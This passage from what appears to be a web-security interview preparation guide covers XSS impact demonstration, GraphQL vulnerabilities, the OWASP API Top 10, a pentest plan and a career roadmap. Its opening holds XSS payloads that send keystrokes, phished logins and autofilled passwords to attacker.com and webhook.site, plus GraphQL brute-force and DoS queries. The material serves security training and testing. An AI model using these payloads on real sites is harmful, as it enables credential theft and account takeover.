    new Image().src='https://webhook.site/YOUR-ID?k='+e.key;
});
```

**3. Demonstrate DOM manipulation (phishing within trusted context):**
```javascript
// Replace the entire page content with a fake login form
document.body.innerHTML='<h1>Session expired. Please log in.</h1><form action="https://attacker.com/collect" method="POST">Username: <input name="user"><br>Password: <input type="password" name="pass"><br><button>Login</button></form>';
```

**4. Demonstrate credential extraction (if the page has auto-fill):**
```javascript
// Create a hidden form that auto-fills from browser's password manager
var form = document.createElement('form');
form.innerHTML = '<input type="password" name="p" autocomplete="current-password">';
document.body.appendChild(form);
setTimeout(function(){
    new Image().src='https://attacker.com/steal?p='+encodeURIComponent(form.querySelector('input').value);
}, 1000);
```

**5. Write a detailed impact section in the report:** "This XSS allows an attacker to: (1) steal session cookies and take over accounts (bypass HttpOnly if not set), (2) capture all keystrokes including passwords, (3) redirect users to phishing pages in the trusted origin context, (4) make any HTTP request on behalf of the victim (CSRF bypass)."

---

**Q22.** What is GraphQL and what security vulnerabilities are unique to GraphQL APIs versus REST APIs?

**Answer:**
**GraphQL:** A query language for APIs where the client specifies exactly what data they want in a single flexible query, versus REST where endpoints return fixed data structures.

```graphql
# GraphQL query — client specifies exactly what they want
query {
  user(id: "123") {
    name
    email
    orders {
      id
      total
      items {
        name
        price
      }
    }
  }
}
```

**Security vulnerabilities unique to GraphQL:**

**1. Introspection — exposes entire API schema:**
```graphql
# Introspection query reveals all types, fields, and mutations
{ __schema { types { name fields { name type { name } } } } }

# Find all mutations (data-modifying operations)
{ __schema { mutationType { fields { name } } } }
```

**2. Batching attacks (DoS/brute force):**
```graphql
# GraphQL can execute multiple operations in one request
[
  {"query": "mutation { login(password: \"1234\") { token } }"},
  {"query": "mutation { login(password: \"5678\") { token } }"},
  ... (repeat 10,000 times)
]
# 10,000 login attempts bypass rate limiting that counts HTTP requests
```

**3. Deep nesting / circular queries (DoS):**
```graphql
# If users have posts and posts have a user field → infinite nesting
{ user { posts { user { posts { user { posts { ...forever... } } } } } } }
# Causes exponential server resource consumption
```

**4. IDOR via GraphQL IDs:**
```graphql
# Same IDOR as REST — changing user ID in a query
{ user(id: "456") { name email creditCardNumbers } }
```

**Defence:** Disable introspection in production, query depth limiting, query complexity scoring, per-field authorisation checks.

---

**Q23.** What is the OWASP API Security Top 10? How does it differ from the regular OWASP Top 10?

**Answer:** The OWASP API Security Top 10 (2023) focuses specifically on REST, GraphQL, gRPC, and SOAP API security — distinct from the web application-focused Top 10.

| # | API Security Top 10 | Key Difference from Web App Top 10 |
|---|--------------------|------------------------------------|
| API1 | Broken Object Level Authorisation (BOLA/IDOR) | Same as web IDOR but APIs expose object IDs more explicitly in JSON |
| API2 | Broken Authentication | Specifically: weak API keys, missing token rotation, no expiration |
| API3 | Broken Object Property Level Authorisation | Exposing ALL object fields when only some should be visible (e.g., returning `password_hash` in user profile response) |
| API4 | Unrestricted Resource Consumption | No rate limiting on compute-intensive operations (image resizing, PDF generation) |
| API5 | Broken Function Level Authorisation | Admin functions accessible via API even when hidden in UI |
| API6 | Unrestricted Access to Sensitive Business Flows | API endpoints designed for one purpose abused for another (mass-creating accounts) |
| API7 | Server-Side Request Forgery | SSRF via URL parameters accepted by APIs |
| API8 | Security Misconfiguration | Verbose error messages, unnecessary HTTP methods, CORS wildcard |
| API9 | Improper Inventory Management | Undocumented endpoints, deprecated API versions still active and exposed |
| API10 | Unsafe Consumption of APIs | Trusting upstream API responses without validation → injection via upstream |

**Key difference:** APIs lack browser protections (no SOP, no CSP), are accessed programmatically (easier to automate attacks), and often return raw data that web apps would format safely.

---

**Q24.** You are hired to do a black-box web application pentest on a SaaS product. The application has a free trial signup. Walk through your complete testing approach from day 1 to final report.

**Answer:**

**Day 1-2: Setup and Reconnaissance**
```
1. Review scope: which domains, subdomains, IPs are in scope
2. Passive recon: Shodan, crt.sh for subdomains, BuiltWith for tech stack
3. Manual browsing: understand the application's full functionality
4. Burp Suite configuration: capture all traffic
5. Create test accounts: free trial as regular user + find any admin demo
6. Map all endpoints in Burp Target → Sitemap
```

**Day 3-5: Authentication and Access Control**
```
1. Password policy (minimum complexity, lockout after failures)
2. Account registration: username enumeration via error messages
3. Password reset: predictable tokens? Re-usable tokens? No expiry?
4. Session management: cookie flags (HttpOnly, Secure, SameSite), token entropy
5. Multi-tenancy: can trial user A access trial user B's data? (IDOR)
6. Vertical privilege escalation: can trial user access paid features by modifying API calls?
```

**Day 6-8: Input Validation**
```
1. SQLi: all input fields, URL parameters, JSON body parameters
2. XSS: reflected (URL params), stored (comments, profile fields, messages)
3. File upload: if any upload feature exists
4. SSRF: any URL-fetch functionality
5. Path traversal: file download features
```

**Day 9-11: Business Logic and API**
```
1. Price manipulation: discount codes, pricing tiers
2. Race conditions: subscription upgrades, credit purchase
3. API security: GraphQL/REST — BOLA, mass assignment, missing auth
4. Third-party integrations: Stripe webhooks, OAuth, SSO
```

**Day 12-13: Infrastructure**
```
1. SSL/TLS: weak ciphers, expired cert, HSTS not set
2. Security headers: CSP, X-Frame-Options, etc.
3. Information disclosure: error messages, debug info
4. Exposed sensitive files: .git, .env, backup files
```

**Day 14-15: Reporting**
```
1. Organise findings by severity
2. Write executive summary
3. For each finding: description, evidence (screenshots/request-response), CVSS score, business impact, recommendation
4. Review for false positives
5. Deliver to client with verbal debrief call
```

---

**Q25.** What skills and tools distinguish a senior web application security engineer from a junior one? What is your 12-month learning roadmap to progress from junior to mid-level?

**Answer:**

| Skill | Junior | Mid-Level | Senior |
|-------|--------|-----------|--------|
| **Tools** | Burp Community, basic SQLMap | Burp Pro, custom Burp extensions, nuclei | Custom exploit development, 0-day research |
| **Methodology** | Follows checklist | Adapts to application's specific context | Creates custom methodologies for novel architectures |
| **Reporting** | Technical findings only | Business impact + PoC | Advises on security architecture |
| **Code review** | Can identify obvious SQLi in code | Comprehensive code review across languages | Identifies logic flaws in complex business logic |
| **Bug bounty** | P3/P4 findings (low/medium) | P2 findings (high) | P1 findings (critical, chained attacks) |
| **Automation** | Uses existing tools | Customises tools, writes scripts | Builds tools |

**12-Month Learning Roadmap (Junior → Mid-Level):**

**Months 1-3: PortSwigger Web Security Academy**
- Complete ALL labs: SQL injection (all 18), XSS (all 30), SSRF (all 7), XXE (all 9)
- Focus on EXPERT labs — these require chaining vulnerabilities

**Months 4-6: Bug Bounty on HackerOne**
- Find first P4 (informational/low) findings — practice report writing
- Focus on a single company's programme, understand their product deeply
- Goal: first paid bounty

**Months 7-9: API Security Specialisation**
- Complete OWASP API Security Top 10 labs (crapi.apisec.ai — intentionally vulnerable API)
- Contribute to a bug bounty programme's API surface
- Learn GraphQL security testing

**Months 10-12: Code Review and Source-Assisted Testing**
- Set up DVWA, WebGoat from source — read the code alongside testing
- Join open-source bug bounty programmes with source code available
- Study real CVEs in frameworks you use (Django CVEs, Rails CVEs)

**Key markers of mid-level readiness:**
- Can find P2 (high severity) bugs in real bug bounty programmes
- Can write a clear, actionable pentest report independently
- Can explain any finding by pointing to the exact vulnerable code line
- Has triaged a real client pentest from scope definition to final report delivery
